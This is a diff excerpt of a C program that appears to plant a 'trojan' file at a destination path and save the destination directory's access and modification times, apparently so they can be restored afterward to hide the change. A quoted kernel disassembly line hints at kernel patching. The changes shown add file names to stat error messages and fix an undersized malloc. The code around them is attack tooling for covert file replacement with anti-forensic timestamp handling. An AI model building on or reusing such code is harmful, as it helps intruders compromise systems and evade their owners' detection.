@@ -172,7 +172,7 @@ int main(int argc, char *argv[])
    destination = argv[2];
 
    if (stat(trojan, &sb) < 0) {
-      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
+      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", trojan, errno);
       exit(-1);
    } else if (!S_ISREG(sb.st_mode)) {
       printf("[x] %s is not a file\n", trojan);
@@ -180,7 +180,7 @@ int main(int argc, char *argv[])
    }
 
    if (stat(destination, &sb) < 0) {
-      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
+      fprintf(stderr, "[x]  %s: STAT ERROR: %d\n", destination, errno);
       exit(-1);
    }
 
@@ -199,7 +199,8 @@ int main(int argc, char *argv[])
 
       dest_dir_str_len = pos - destination;
       printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
-      destination_dir = malloc(pos-destination);
+      destination_dir = malloc(dest_dir_str_len+1);
+      bzero(destination_dir, dest_dir_str_len+1);
       strncpy(destination_dir, destination, dest_dir_str_len);
    } else {
       printf("[x] Destination %s is not a directory or file\n", destination);
@@ -279,7 +280,7 @@ ffffffff80f4bdc9: 48 83 40 78 01        addq    $1, 120(%rax)
 
    /* Save destination directory access and modification times. */
    if (stat(destination_dir, &sb) < 0) {
-      fprintf(stderr, "[x] STAT ERROR: %d\n", errno);
+      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination_dir, errno);
       exit(-1);
    }
    time.actime = sb.st_atime;
